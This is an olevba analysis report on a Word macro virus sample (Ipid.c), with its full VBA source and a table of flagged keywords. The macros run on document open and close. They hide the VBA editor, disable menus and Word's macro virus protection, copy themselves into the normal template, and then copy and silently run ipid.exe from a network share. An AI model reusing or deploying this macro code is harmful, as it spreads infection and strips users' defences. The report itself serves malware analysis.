olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ipid.c-890402e3dce59b54a6009271f49a035b20cbcc00
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ipid.c-890402e3dce59b54a6009271f49a035b20cbcc00 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Ipid.c-890402e3dce59b54a6009271f49a035b20cbcc00 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next 'normal.dot plc
w1 = Application.VBE.Windows.Count
For i = 1 To w1
Application.VBE.Windows(i).Visible = False
Next
i = 0
For Each B In Application.VBE.CommandBars
i = i + 1
Application.VBE.CommandBars(i).Protection = msoBarNoCustomize
Application.VBE.CommandBars(i).Enabled = False
Next
p1 = "\\esm-cpd\e$\ipid.exe"
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
Options.VirusProtection = False
CommandBars(33).Controls("exibir").Controls("barras de ferramentas").Enabled = False
CommandBars(33).Controls("Ferramentas").Controls("opções...").Enabled = False
CommandBars(33).Controls("Ferramentas").Controls("personalizar...").Enabled = False
CommandBars(33).Controls("Ferramentas").Controls("Macro").Controls("macros...").Enabled = False
CommandBars(33).Controls("Ferramentas").Controls("Macro").Controls("Editor do Visual Basic").Enabled = False
CommandBars(33).Controls("Ferramentas").Controls("Macro").Enabled = False
i = 0
For Each B In CommandBars
i = i + 1
If (B.NameLocal = "Barra de menus") Or (B.NameLocal = "Padrão") Or (B.NameLocal = "Formatação") Then
CommandBars(i).Protection = msoBarNoCustomize
Else
CommandBars(i).Enabled = False
End If
Next
c1 = Documents.Count
If c1 >= 1 Then
   e1 = ActiveDocument.VBProject.VBComponents.Count
   If e1 >= 1 Then
      e2 = ActiveDocument.VBProject.VBComponents.Item(1).Name
      If e1 >= 2 Then
          e3 = ActiveDocument.VBProject.VBComponents.Item(2).Name
          c2 = MacroContainer
          If c2 = ActiveDocument.Name Then
             d1 = ActiveDocument.FullName
             d2 = ActiveDocument.AttachedTemplate.FullName
             d4 = "NewMacros"
             e5 = NormalTemplate.VBProject.VBComponents.Count
             If e5 >= 1 Then
                  e6 = NormalTemplate.VBProject.VBComponents.Item(1).Name
                  If e5 >= 2 Then
                         e7 = NormalTemplate.VBProject.VBComponents.Item(2).Name
                         Application.OrganizerDelete d2, e7, wdOrganizerObjectProjectItems
                         d2 = ActiveDocument.AttachedTemplate.FullName
                         d4 = "NewMacros"
                         Application.OrganizerCopy d1, d2, d4, wdOrganizerObjectProjectItems
                         Application.NormalTemplate.Save
                         FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
                         End
                   End If 'rodando no ativo sem modulo no nrmal
                         d2 = ActiveDocument.AttachedTemplate.FullName
                         d4 = "NewMacros"
                         Application.OrganizerCopy d1, d2, d4, wdOrganizerObjectProjectItems
                        Application.NormalTemplate.Save
                        FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
                        End
              End If
           End If 'rodando no normal.dot
            d1 = ActiveDocument.FullName
            d2 = ActiveDocument.AttachedTemplate.FullName
            d4 = "NewMacros"
            Application.OrganizerDelete d1, e3, wdOrganizerObjectProjectItems
            Application.OrganizerCopy d2, d1, d4, wdOrganizerObjectProjectItems
            Application.NormalTemplate.Save
            FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
            End
       End If 'rodando no normal sem modulo no proj
          d1 = ActiveDocument.FullName
          d2 = ActiveDocument.AttachedTemplate.FullName
          d4 = "NewMacros"
          Application.OrganizerCopy d2, d1, d4, wdOrganizerObjectProjectItems
          Application.NormalTemplate.Save
          FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
          End
End If
End If
End Sub

Sub AutoClose()
On Error Resume Next
w1 = Application.VBE.Windows.Count
For i = 1 To w1
Application.VBE.Windows(i).Visible = False
Next
i = 0
For Each B In Application.VBE.CommandBars
i = i + 1
Application.VBE.CommandBars(i).Protection = msoBarNoCustomize
Application.VBE.CommandBars(i).Enabled = False
Next
p1 = "\\esm-cpd\e$\ipid.exe"
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
Options.VirusProtection = False
CommandBars(33).Controls("exibir").Controls("barras de ferramentas").Enabled = False
CommandBars(33).Controls("Ferramentas").Controls("opções...").Enabled = False
CommandBars(33).Controls("Ferramentas").Controls("personalizar...").Enabled = False
CommandBars(33).Controls("Ferramentas").Controls("Macro").Controls("macros...").Enabled = False
CommandBars(33).Controls("Ferramentas").Controls("Macro").Controls("Editor do Visual Basic").Enabled = False
CommandBars(33).Controls("Ferramentas").Controls("Macro").Enabled = False
i = 0
For Each B In CommandBars
i = i + 1
If (B.NameLocal = "Barra de menus") Or (B.NameLocal = "Padrão") Or (B.NameLocal = "Formatação") Then
CommandBars(i).Protection = msoBarNoCustomize
Else
CommandBars(i).Enabled = False
End If
Next
c1 = Documents.Count
If c1 >= 1 Then
   e1 = ActiveDocument.VBProject.VBComponents.Count
   If e1 >= 1 Then
      e2 = ActiveDocument.VBProject.VBComponents.Item(1).Name
      If e1 >= 2 Then
          e3 = ActiveDocument.VBProject.VBComponents.Item(2).Name
          c2 = MacroContainer
          If c2 = ActiveDocument.Name Then
             d1 = ActiveDocument.FullName
             d2 = ActiveDocument.AttachedTemplate.FullName
             d4 = "NewMacros"
             e5 = NormalTemplate.VBProject.VBComponents.Count
             If e5 >= 1 Then
                  e6 = NormalTemplate.VBProject.VBComponents.Item(1).Name
                  If e5 >= 2 Then
                         e7 = NormalTemplate.VBProject.VBComponents.Item(2).Name
                         Application.OrganizerDelete d2, e7, wdOrganizerObjectProjectItems
                         d2 = ActiveDocument.AttachedTemplate.FullName
                         d4 = "NewMacros"
                         Application.OrganizerCopy d1, d2, d4, wdOrganizerObjectProjectItems
                         Application.NormalTemplate.Save
                         FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
                         End
                   End If 'rodando no ativo sem modulo no nrmal
                         d2 = ActiveDocument.AttachedTemplate.FullName
                         d4 = "NewMacros"
                         Application.OrganizerCopy d1, d2, d4, wdOrganizerObjectProjectItems
                        Application.NormalTemplate.Save
                        FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
                        End
              End If
           End If 'rodando no normal.dot
            d1 = ActiveDocument.FullName
            d2 = ActiveDocument.AttachedTemplate.FullName
            d4 = "NewMacros"
            Application.OrganizerDelete d1, e3, wdOrganizerObjectProjectItems
            Application.OrganizerCopy d2, d1, d4, wdOrganizerObjectProjectItems
            Application.NormalTemplate.Save
            FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
            End
       End If 'rodando no normal sem modulo no proj
          d1 = ActiveDocument.FullName
          d2 = ActiveDocument.AttachedTemplate.FullName
          d4 = "NewMacros"
          Application.OrganizerCopy d2, d1, d4, wdOrganizerObjectProjectItems
          Application.NormalTemplate.Save
          FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
          End
End If
End If

End Sub
Sub Macro1()
Attribute Macro1.VB_Description = "Macro gravada 14/06/00 por BAFZ"
Attribute Macro1.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro1"
'
' Macro1 Macro
' Macro gravada 14/06/00 por BAFZ
'
End Sub
Sub Macro2()
Attribute Macro2.VB_Description = "Macro gravada 14/06/00 por BAFZ"
Attribute Macro2.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro2"
'
' Macro2 Macro
' Macro gravada 14/06/00 por BAFZ
'
    Overtype = Not Overtype
    Selection.Extend
    ActiveDocument.TrackRevisions = Not ActiveDocument.TrackRevisions
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |ipid.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

